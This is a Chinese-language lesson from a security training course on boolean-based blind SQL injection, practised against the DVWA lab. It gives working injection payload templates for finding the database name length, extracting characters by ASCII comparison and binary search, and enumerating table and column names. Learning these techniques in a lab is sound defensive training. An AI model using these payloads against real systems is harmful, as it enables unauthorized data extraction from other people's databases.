---
title: Day031：SQL 注入进阶 - 布尔盲注
tags:
  - 网络安全
  - SQL注入
  - 盲注
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d031
date: 2026-02-22
updated: 2026-01-28
---

# Day031：SQL 注入进阶 - 布尔盲注

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 6：SQL 注入进阶 |
| **今日主题** | 布尔盲注原理与实战 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你发现一个注入点，但无论怎么构造 payload，页面只显示"查询成功"或"查询失败"，没有任何数据回显。
>
> **问题**：没有回显，怎么拿数据？
>
> **今天的任务**：学习布尔盲注，用"是"或"否"的方式一点点把数据"问"出来。

---

## 今日目标

- [ ] 理解盲注与有回显注入的区别
- [ ] 掌握布尔盲注的核心原理
- [ ] 手工完成布尔盲注获取数据库名
- [ ] 理解二分法优化思路

**闯关条件**：使用布尔盲注获取 DVWA 数据库名的第一个字符。

---

## 实战任务（先动手！）

### 任务 1：理解盲注场景（15 分钟）

**环境**：DVWA - SQL Injection (Blind) - Low

**操作步骤**：

1. 设置 Security Level 为 Low
2. 输入 `1`，观察页面
3. 输入 `1' and '1'='1`，观察页面
4. 输入 `1' and '1'='2`，观察页面

**记录**：
```
输入 1 的结果：________________
输入 1' and '1'='1 的结果：________________
输入 1' and '1'='2 的结果：________________
```

**思考**：两个 payload 的页面有什么不同？

---

### 任务 2：判断数据库名长度（20 分钟）

**原理**：用条件判断"猜"长度

**Payload 模板**：
```sql
1' and length(database())=N and '1'='1
```

**操作步骤**：

1. 测试 `1' and length(database())=1 and '1'='1`
2. 测试 `1' and length(database())=2 and '1'='1`
3. 测试 `1' and length(database())=3 and '1'='1`
4. 继续...直到页面显示"存在"

**记录**：
```
数据库名长度：____
```

---

### 任务 3：逐字符猜解数据库名（40 分钟）

**原理**：用 `substr()` 提取字符，用 `ascii()` 转换成数字比较

**Payload 模板**：
```sql
1' and ascii(substr(database(),1,1))=N and '1'='1
```

**操作步骤**：

1. 猜第一个字符：
   - 测试 `ascii(substr(database(),1,1))=97`（a）
   - 测试 `ascii(substr(database(),1,1))=98`（b）
   - ...继续

2. 使用二分法加速：
   - 测试 `ascii(substr(database(),1,1))>109`（m）
   - 根据结果缩小范围

**ASCII 速查**：
```
a=97, b=98, c=99, d=100, e=101, f=102, g=103, h=104, i=105
j=106, k=107, l=108, m=109, n=110, o=111, p=112, q=113, r=114
s=115, t=116, u=117, v=118, w=119, x=120, y=121, z=122
0=48, 1=49, ..., 9=57
_=95
```

**记录**：
```
第 1 个字符 ASCII 值：____ → 字符：____
第 2 个字符 ASCII 值：____ → 字符：____
第 3 个字符 ASCII 值：____ → 字符：____
第 4 个字符 ASCII 值：____ → 字符：____
数据库名：________________
```

---

### 任务 4：获取表名（30 分钟）

**Payload 模板**：
```sql
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=N and '1'='1
```

**步骤**：
1. 先获取表名长度
2. 再逐字符猜解

**记录**：
```
第一个表名：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解盲注与回显注入区别 | 15 分 |
| 成功判断数据库名长度 | 20 分 |
| 成功获取数据库名第一个字符 | 25 分 |
| 成功获取完整数据库名 | 25 分 |
| 理解二分法优化 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 盲注 vs 有回显注入

| 类型 | 特点 | 难度 |
|------|------|------|
| **有回显注入** | 页面直接显示数据 | 简单 |
| **报错注入** | 错误信息泄露数据 | 中等 |
| **布尔盲注** | 只有真/假两种状态 | 较难 |
| **时间盲注** | 通过延迟判断 | 较难 |

### 布尔盲注原理

```
核心思想：通过构造条件判断，观察页面响应的不同

条件为真 → 页面 A（如：User ID exists）
条件为假 → 页面 B（如：User ID is MISSING）

利用这个差异，逐位猜解数据
```

**类比**：
```
你：数据库名第一个字母是 a 吗？
服务器：不是（页面 B）
你：是 b 吗？
服务器：不是（页面 B）
你：是 c 吗？
服务器：不是（页面 B）
你：是 d 吗？
服务器：是的！（页面 A）
```

### 核心函数

| 函数 | 作用 | 示例 |
|------|------|------|
| `length()` | 获取字符串长度 | `length(database())` |
| `substr()` | 截取子字符串 | `substr(database(),1,1)` |
| `ascii()` | 字符转 ASCII 码 | `ascii('a')` = 97 |
| `char()` | ASCII 码转字符 | `char(97)` = 'a' |

### 二分法优化

手工测试 26 个字母太慢，用二分法：

```sql
-- 第一步：判断是否大于 m（109）
1' and ascii(substr(database(),1,1))>109 and '1'='1

-- 如果为真，说明在 n-z 范围
-- 如果为假，说明在 a-m 范围

-- 继续二分...
```

**复杂度对比**：
- 遍历法：最多 26 次
- 二分法：最多 5 次（log2(26) ≈ 5）

### 完整盲注流程

```
1. 判断是否存在注入
2. 判断数据库名长度
3. 逐字符猜解数据库名
4. 获取表名列表
5. 逐个猜解表名
6. 获取列名
7. 获取数据
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 页面无明显差异 | 看不出真假 | 查看页面源码、响应长度 |
| 引号闭合问题 | 报错或无响应 | 检查引号数量和类型 |
| 大小写敏感 | 猜不对 | 注意区分大小写 |
| 特殊字符 | 下划线等猜不到 | 扩大 ASCII 范围 |

---

## 知识卡片速查

### 布尔盲注 Payload 模板

```sql
# 判断长度
1' and length(database())=N--

# 猜解字符（遍历法）
1' and ascii(substr(database(),1,1))=97--

# 猜解字符（二分法）
1' and ascii(substr(database(),1,1))>109--

# 获取表名
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=N--

# 获取列名
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=N--
```

### 常用 ASCII 码

```
a-z: 97-122
A-Z: 65-90
0-9: 48-57
空格: 32
下划线: 95
```

---

## 常见问题

**Q1：为什么叫"盲注"？**

A1：因为看不到数据直接回显，像是"闭着眼睛"注入，只能通过间接方式判断。

**Q2：手工盲注太慢怎么办？**

A2：
1. 使用二分法优化
2. 写 Python 脚本自动化
3. 使用 SQLMap

**Q3：怎么判断页面真假？**

A3：
1. 页面内容不同
2. 响应长度不同
3. HTTP 状态码不同
4. 响应时间不同（时间盲注）

---

## 明日预告

**Day 032：SQL 注入进阶 - 时间盲注**

明天你将：
- 学习时间盲注的原理
- 使用 `sleep()` 函数判断条件
- 编写 Python 自动化脚本

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 获取的数据库名 | |
| 使用的优化方法 | |
| 今日收获 | |

---

> **导师点评**：
>
> 欢迎来到第二阶段！从今天开始，难度升级。
>
> 布尔盲注是渗透测试的基本功。没有回显？不怕，一个字符一个字符问出来。
>
> 看起来很笨？但这就是实战。很多时候，你只能用这种方式拿数据。
>
> 今天手工体验一下，明天我们会写脚本自动化。因为真实环境里，没人有耐心手工猜 100 个字符。
>
> **记住：渗透不是比速度，是比耐心和方法。**

```bash
echo "Day 031 Complete! 布尔盲注入门！"
```
